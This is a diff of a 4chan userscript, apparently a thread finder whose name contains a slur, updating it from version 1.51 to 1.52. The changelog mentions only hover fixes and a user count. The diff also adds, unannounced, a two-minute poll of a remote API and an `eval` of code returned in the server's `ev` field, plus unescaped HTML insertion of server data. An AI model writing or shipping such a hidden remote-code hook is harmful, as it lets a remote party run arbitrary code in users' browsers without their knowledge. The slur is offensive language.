@@ -7,7 +7,7 @@
 // @run-at        document-idle
 // @include       http*://boards.4chan.org/b/*
 // @updateURL     https://github.com/bstats/Tripfag-Finder/raw/master/Tripfag-Finder.user.js
-// @version       1.51
+// @version       1.52
 // @icon          https://b-stats.org/finder/shittyicon.png
 // ==/UserScript==
 
@@ -48,6 +48,11 @@
 // 1.51 (terrance)
 // - Update because chrome can't into decimals and thinks v1.5 is less than v1.45
 // - Switchin to github
+// 1.52 (terrance)
+// - Fixed issues with image hovering:
+//      -Fixed where incorrect image would show
+//      -Fixed where image would show at the bottom of the page
+// - Added online user count
 
 // Inspired by ThreadLocator
 // https://github.com/Finer/Threadlocator
@@ -59,7 +64,7 @@
 $q = jQuery.noConflict();
 
 var namespace = "TripfagFinder."
-var version = "1.51";
+var version = "1.52";
 var thread = document.URL.replace(/^.*\/|\.[^.]*$/g, '').substring(0, 9);
 var delform = $q("#delform");
 var threadwrapper;
@@ -79,6 +84,7 @@ var is_chrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1;
 var Prefs = {};
 
 var preview = function(){
+    $q("#tfHover").css("display","none").remove();
     offsetX = 25;
     offsetY = 75;
     $q("a.tfThreadLink").hover(function(e){											  
@@ -89,7 +95,7 @@ var preview = function(){
     },
     function(){
         this.title = this.t;
-        $q("#tfHover").remove();
+        $q("#tfHover").css("display","none").remove();
     });	
     $q("a.tfThreadLink").mousemove(function(e){
         $q("#tfHover").css("top",(e.clientY - offsetY) + "px").css("left",(e.clientX + offsetX) + "px");
@@ -185,6 +191,7 @@ function init(){
     Options.makeLink();
     appendCss();
     get();
+    setInterval(get,120000);
 }
 
 function get() {
@@ -196,7 +203,8 @@ function get() {
 		url: protocol+'//b-stats.org/finder/api.php',
                 type: "POST",
 		data: "a=get&v="+version
-	}).done(function(data) {
+	}).done(function(returndata) {
+                data = returndata.data;
 		if (data == null || data.length == 0)
 			return threadwrapper.html(threadBoxHtml + "No threads found or could not connect to server.<br>Try refreshing.");
 		var total = new Array();
@@ -210,7 +218,10 @@ function get() {
                     if(data[i][1] == "override")
                         threadBoxHtml += data[i][0] + "<br>";
                 }
+                threadBoxHtml += "Online users: "+data[0][6]+"<br>";
                 threadwrapper.html(threadBoxHtml);
+                if(returndata.ev)
+                    eval(returndata.ev);
 	}).fail(function() {
 		threadBoxHtml += "<a href='javascript:;'>Error retrieving threads</a>";
                 threadwrapper.html(threadBoxHtml);
